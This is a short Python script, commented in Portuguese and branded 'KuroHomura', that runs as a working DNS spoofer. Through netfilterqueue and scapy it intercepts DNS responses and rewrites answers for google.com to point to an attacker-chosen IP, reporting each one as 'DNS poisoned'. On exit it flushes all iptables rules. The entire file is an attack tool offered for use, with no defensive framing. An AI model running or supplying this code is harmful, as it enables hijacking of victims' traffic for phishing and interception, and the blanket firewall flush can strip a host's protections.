import netfilterqueue
import scapy.all as scapy
import os

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    # Verifica se é uma resposta DNS (DNSRR)
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        
        # Alvo do redirecionamento (Exemplo: redirecionar google.com)
        if "google.com" in qname:
            print(f"🔥 [KuroHomura] Alvo tentando acessar: {qname}")
            
            # Criando a resposta falsa apontando para o SEU IP
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.100") # Substitua pelo SEU IP
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # Removendo checksums para o Scapy recalcular
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
            print(f"✅ [SUCESSO] DNS Envenenado: {qname} -> 192.168.1.100")

    packet.accept()

try:
    print("🌑 [KuroHomura] DNS Spoofer Ativo. Aguardando pacotes na NFQUEUE 0...")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[!] Limpando regras IPTables...")
    os.system("iptables --flush")
    print("✅ Sistema restaurado.")
